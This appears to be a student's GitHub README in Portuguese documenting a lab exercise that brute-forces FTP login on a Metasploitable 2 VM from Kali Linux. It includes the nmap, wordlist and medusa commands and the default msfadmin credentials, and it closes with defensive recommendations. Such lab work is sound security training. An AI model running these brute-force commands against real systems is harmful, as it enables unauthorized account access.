# desafioforcabruta
````markdown
# Desafio: Força Bruta FTP com Medusa

## Objetivo
Realizar um teste de força bruta em FTP em ambiente controlado, usando Kali Linux (atacante) e Metasploitable 2 (alvo).

## Ambiente
- Kali Linux (VM)  
- Metasploitable 2 (VM)  
- Rede: Host-only (VirtualBox)  
- IP do alvo: `192.168.56.101`

## Ferramentas usadas
- Medusa  
- Nmap  
- Cliente FTP (ftp)

## Passos realizados

### 1. Identificação do IP
Comando executado na VM Metasploitable:
```bash
ifconfig
````

Evidência: <img width="720" height="400" alt="image" src="https://github.com/user-attachments/assets/74ec30ab-ffb1-48a1-9da3-1a184979100b" />


### 2. Verificação do serviço FTP

Comando executado no Kali:

```bash
nmap -sV -p 21 192.168.56.101
```

Evidência: <img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/2d6d3f22-36ec-45a8-9572-ef70d54b4e9e" />

Resultado esperado: porta 21 aberta e serviço `ftp` / `vsftpd`.

### 3. Criação da wordlist simples

No Kali criei o arquivo `senhas.txt` com senhas comuns:

```bash
cat > senhas.txt <<EOF
12345
password
msfadmin
admin
root
123456
EOF
```

Evidência: <img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/4113e1f6-5fd0-4d99-8ef9-a4a34d8fd46b" />


### 4. Teste de login FTP manual

No Kali:

```bash
ftp 192.168.56.101
# usuário: msfadmin
# senha: msfadmin
# depois: bye
```

Evidência: <img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/b66590df-8162-4d9d-b7eb-3284039bff28" />


### 5. Ataque de força bruta com Medusa

Comando usado:

```bash
medusa -h 192.168.56.101 -u msfadmin -P senhas.txt -M ftp
```

Resultado encontrado (preencha com o que aparecer):
`<exemplo: FOUND: 192.168.56.101:21 msfadmin:msfadmin>`
Evidência: <img width="1280" height="800" alt="image" src="https://github.com/user-attachments/assets/875de009-4a13-4070-895d-41a17ce16212" />

## Recomendações

* Não usar senhas fracas ou previsíveis.
* Implementar bloqueio temporário de conta após várias tentativas falhas.
* Habilitar autenticação multifator (MFA) quando possível.
* Monitorar logs para detectar tentativas de força bruta.

## Conclusão

O exercício demonstra como ataques de força bruta podem comprometer contas com senhas fracas em ambientes sem proteção adequada. Reforça a necessidade de políticas de senha, bloqueio de acesso e monitoramento contínuo.
